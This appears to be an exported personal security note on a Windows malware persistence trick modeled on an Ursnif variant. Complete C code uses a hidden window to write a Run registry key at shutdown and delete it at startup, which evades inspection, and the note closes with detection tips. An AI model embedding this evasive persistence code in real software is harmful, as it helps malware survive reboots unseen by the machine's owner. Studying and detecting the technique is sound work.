<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Install & Remove Persistence on Shutdown & Startup</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Install &amp; Remove Persistence on Shutdown &amp; Startup</h1></strong><br />By creating an invisible window class, you can watch for system shutdown messages and install your persistence mechanism just before Windows shuts down. Then when you program starts up, you delete the registry key.<br /><br /><strong>Examples</strong><br />• <a href="https://www.cybereason.com/blog/new-ursnif-variant-targets-japan-packed-with-new-features">https://www.cybereason.com/blog/new-ursnif-variant-targets-japan-packed-with-new-features</a> (go to NEW STEALTHY PERSISTENCE MECHANISM heading)<br />• <br /><br /><strong><h2>## Window Class Messages</h2></strong><br /><a href="https://docs.microsoft.com/en-us/windows/win32/winmsg/window-classes">https://docs.microsoft.com/en-us/windows/win32/winmsg/window-classes</a><br /><a href="https://docs.microsoft.com/en-us/windows/win32/winmsg/windowing">https://docs.microsoft.com/en-us/windows/win32/winmsg/windowing</a><br /><br />A window class is a set of parameters your define that the OS uses to create a GUI window.<br />These windows can receive events, and they respond to these events.<br />e.g. clipboard is used, keyboard is pressed, etc.<br /><a href="https://docs.microsoft.com/en-us/windows/win32/winmsg/about-messages-and-message-queues">https://docs.microsoft.com/en-us/windows/win32/winmsg/about-messages-and-message-queues</a><br /><br />There are also messages for when the system is being shutdown, or going to sleep.<br />You can use these to install persistence when the system shuts down.<br /><br /><strong><h3>### System Shutdown Messages</h3></strong><br /><code>WM_QUERYENDSESSION</code> is sent when a user calls a system shutdown function.<br />It covers system shutdown, system restart, and user logoff.<br /><code>WM_ENDSESSION</code> is sent after the results of the shutdown request are processed and informs the application the session is ending (we&#39;re closing down).<br /><br /><a href="https://docs.microsoft.com/en-us/windows/win32/shutdown/wm-queryendsession">https://docs.microsoft.com/en-us/windows/win32/shutdown/wm-queryendsession</a><br /><a href="https://docs.microsoft.com/en-us/windows/win32/shutdown/wm-endsession">https://docs.microsoft.com/en-us/windows/win32/shutdown/wm-endsession</a><br /><br /><strong><h3>### System Suspension Messages</h3></strong><br /><code>WM_POWERBROADCAST</code> notifies that a power-management event has occured<br />(system will suspsend, or sleep, etc.)<br /><br /><code>PBT_APMSUSPEND</code> notifies that the system is suspending.<br /><code>PBT_APMRESUMESUSPEND</code> notifies that the system has resumed after suspension.<br /><br /><a href="https://docs.microsoft.com/en-us/windows/win32/power/wm-powerbroadcast">https://docs.microsoft.com/en-us/windows/win32/power/wm-powerbroadcast</a><br /><br />From my testing Run keys don&#39;t get deleted by system Sleep.<br /><br /><strong><h2>## Code</h2></strong><br /><div class="codebox"><div class="codebox">/*<br />Compile&nbsp;as&nbsp;Release&nbsp;x64.<br /><br />Creates&nbsp;an&nbsp;invisible&nbsp;window&nbsp;that&nbsp;watches&nbsp;for&nbsp;system&nbsp;shutdown&nbsp;messages.<br />Upon&nbsp;catching&nbsp;a&nbsp;shutdown,&nbsp;it&nbsp;writes&nbsp;a&nbsp;persistence&nbsp;key&nbsp;to&nbsp;&quot;Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;&nbsp;as&nbsp;&quot;persist&quot;<br />Don&#39;t&nbsp;click&nbsp;OK&nbsp;on&nbsp;the&nbsp;MessageBox,&nbsp;that&nbsp;will&nbsp;cause&nbsp;the&nbsp;program&nbsp;to&nbsp;exit.&nbsp;Just&nbsp;run&nbsp;the&nbsp;program,&nbsp;see&nbsp;the&nbsp;MessageBox,&nbsp;then&nbsp;shutdown&nbsp;-&nbsp;persistence&nbsp;will&nbsp;install.<br />Program&nbsp;will&nbsp;then&nbsp;run&nbsp;on&nbsp;reboot&nbsp;and&nbsp;delete&nbsp;persistence&nbsp;key.<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;InstallRunPersistence(void)<br />{<br />	BOOL&nbsp;okay&nbsp;=&nbsp;TRUE;<br />	LSTATUS&nbsp;lstat_ret&nbsp;=&nbsp;0;<br />	HKEY&nbsp;h_key&nbsp;=&nbsp;NULL;<br />	char&nbsp;exe_path[MAX_PATH]&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	//&nbsp;get&nbsp;path&nbsp;to&nbsp;current&nbsp;exe<br />	GetModuleFileNameA(NULL,&nbsp;exe_path,&nbsp;MAX_PATH);<br /><br />	//&nbsp;create&nbsp;key<br />	lstat_ret&nbsp;=&nbsp;RegCreateKeyA(HKEY_CURRENT_USER,&nbsp;&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;,&nbsp;&amp;h_key);<br />	if&nbsp;(lstat_ret&nbsp;!=&nbsp;ERROR_SUCCESS)<br />		goto&nbsp;cleanup;<br /><br />	//&nbsp;set&nbsp;Run&nbsp;key<br />	lstat_ret&nbsp;=&nbsp;RegSetValueExA(h_key,&nbsp;&quot;persist&quot;,&nbsp;0,&nbsp;REG_SZ,&nbsp;(BYTE*)exe_path,&nbsp;sizeof(exe_path));<br />	if&nbsp;(lstat_ret&nbsp;!=&nbsp;ERROR_SUCCESS)<br />		goto&nbsp;cleanup;<br /><br />cleanup:<br />	if&nbsp;(h_key)&nbsp;RegCloseKey(h_key);<br /><br />	return&nbsp;lstat_ret;<br />}<br /><br />int&nbsp;RemoveRunPersistence(void)<br />{<br />	BOOL&nbsp;okay&nbsp;=&nbsp;TRUE;<br />	LSTATUS&nbsp;lstat_ret&nbsp;=&nbsp;0;<br />	HKEY&nbsp;h_key&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;open&nbsp;key&nbsp;(KEY_SET_VALUE&nbsp;perms&nbsp;needed&nbsp;for&nbsp;deletion)<br />	lstat_ret&nbsp;=&nbsp;RegOpenKeyExA(HKEY_CURRENT_USER,&nbsp;&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;,&nbsp;0,&nbsp;KEY_SET_VALUE,&nbsp;&amp;h_key);<br />	if&nbsp;(lstat_ret&nbsp;!=&nbsp;ERROR_SUCCESS)<br />		goto&nbsp;cleanup;<br /><br />	//&nbsp;delete&nbsp;&quot;persist&quot;&nbsp;key<br />	lstat_ret&nbsp;=&nbsp;RegDeleteValueA(h_key,&nbsp;&quot;persist&quot;);<br />	if&nbsp;(lstat_ret&nbsp;!=&nbsp;ERROR_SUCCESS)<br />		goto&nbsp;cleanup;<br /><br />cleanup:<br />	if&nbsp;(h_key)&nbsp;RegCloseKey(h_key);<br /><br />	return&nbsp;lstat_ret;<br />}<br /><br />LRESULT&nbsp;CALLBACK&nbsp;WindowProc(HWND&nbsp;hwnd,&nbsp;UINT&nbsp;uMsg,&nbsp;WPARAM&nbsp;wParam,&nbsp;LPARAM&nbsp;lParam)<br />{<br />	switch&nbsp;(uMsg)<br />	{<br />	case&nbsp;WM_QUERYENDSESSION:								//&nbsp;WM_QUERYENDSESSION&nbsp;catches&nbsp;shutdown,&nbsp;restart,&nbsp;and&nbsp;logoff<br />		InstallRunPersistence();<br />		return&nbsp;TRUE;										//&nbsp;return&nbsp;1&nbsp;to&nbsp;WM_QUERYENDSESSION&nbsp;to&nbsp;allow&nbsp;system&nbsp;shutdown<br />	default:<br />		return&nbsp;DefWindowProc(hwnd,&nbsp;uMsg,&nbsp;wParam,&nbsp;lParam);<br />	}<br /><br />	return&nbsp;0;<br />}<br /><br />int&nbsp;WINAPI&nbsp;WinMain(HINSTANCE&nbsp;hInstance,&nbsp;HINSTANCE&nbsp;hPrevInstance,&nbsp;LPSTR&nbsp;lpCmdLine,&nbsp;int&nbsp;nCmdShow)<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;FALSE;<br />	int&nbsp;i_ret&nbsp;=&nbsp;0;<br /><br />	//&nbsp;create&nbsp;invisible&nbsp;window&nbsp;class<br />	HWND&nbsp;hwnd&nbsp;=&nbsp;NULL;<br />	const&nbsp;wchar_t&nbsp;class_name[]&nbsp;=&nbsp;L&quot;invisible&quot;;<br /><br />	WNDCLASS&nbsp;wc&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	wc.lpfnWndProc&nbsp;=&nbsp;WindowProc;<br />	wc.hInstance&nbsp;=&nbsp;hInstance;<br />	wc.lpszClassName&nbsp;=&nbsp;class_name;<br /><br />	RegisterClassW(&amp;wc);<br />	hwnd&nbsp;=&nbsp;CreateWindowW(class_name,&nbsp;L&quot;invisible&quot;,&nbsp;WS_OVERLAPPEDWINDOW,&nbsp;CW_USEDEFAULT,&nbsp;CW_USEDEFAULT,&nbsp;CW_USEDEFAULT,&nbsp;CW_USEDEFAULT,&nbsp;NULL,&nbsp;NULL,&nbsp;hInstance,&nbsp;NULL);<br />	ShowWindow(hwnd,&nbsp;SW_HIDE);		//&nbsp;hide&nbsp;window<br />	UpdateWindow(hwnd);<br /><br />	//&nbsp;remove&nbsp;persistence&nbsp;on&nbsp;startup<br />	i_ret&nbsp;=&nbsp;RemoveRunPersistence();<br />	<br />	if&nbsp;(i_ret&nbsp;==&nbsp;0)<br />		MessageBoxA(NULL,&nbsp;&quot;removed&nbsp;run&nbsp;persistence!&quot;,&nbsp;&quot;info&quot;,&nbsp;MB_OK);<br />	else<br />	{<br />		char&nbsp;fail_string[256]&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />		sprintf_s(fail_string,&nbsp;256,&nbsp;&quot;removing&nbsp;run&nbsp;persistence&nbsp;failed:&nbsp;%d&quot;,&nbsp;i_ret);<br />		MessageBoxA(NULL,&nbsp;fail_string,&nbsp;&quot;info&quot;,&nbsp;MB_OK);<br />	}<br />	<br />	//&nbsp;program&nbsp;exeuction&nbsp;goes&nbsp;here...<br />	MessageBoxA(NULL,&nbsp;&quot;why&nbsp;hello&nbsp;there&quot;,&nbsp;&quot;greetings&quot;,&nbsp;MB_OK);<br />	//Sleep(INFINITE)		//&nbsp;you&nbsp;CANNOT&nbsp;put&nbsp;Sleep(INFINITE)&nbsp;here,&nbsp;because&nbsp;your&nbsp;code&nbsp;to&nbsp;catch&nbsp;WM_QUERYENDSESSION&nbsp;will&nbsp;never&nbsp;run<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## Detection</h2></strong><br /><strong><h3>### Boot into Safe Mode</h3></strong><br />On shutdown/suspension you install persistence.<br />On startup you delete your persistence.<br /><br />To detect this persistence, boot into safe mode.<br />Booting into safe mode prevents any extra code from running on startup, which means the installed persistence won&#39;t be deleted and you can find it.<br /><br /><strong><h3>### Check for strange window classes</h3></strong><br />To catch system shutdown messages, a window class needs to be created.<br />Usually these are made invisible.<br />In WinLister, <code>Options &gt; Display Hidden Windows</code> , and check for any strange window classes.<br />You probably won&#39;t be able to find anything because it won&#39;t have a name and will blend in pretty well.<br />Here my window class is called <code>invisible</code> (to make it obvious)<br /><br /><a href=""><img src="images/1740-1.png" alt="images/1740-1.png" /></a></div>
</body>
</html>
